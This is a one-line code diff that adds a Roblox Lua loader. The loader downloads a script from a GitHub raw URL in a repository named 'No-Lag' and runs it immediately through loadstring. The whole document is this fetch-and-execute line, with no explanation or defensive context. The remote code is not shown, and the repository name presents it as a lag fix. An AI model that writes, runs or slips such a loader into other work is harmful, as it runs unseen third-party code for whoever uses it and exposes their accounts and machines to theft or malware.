@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dark-spawner1/No-Lag.lD/refs/heads/main/d5412e2af139abb7d42231fc57866e98.txt"))()
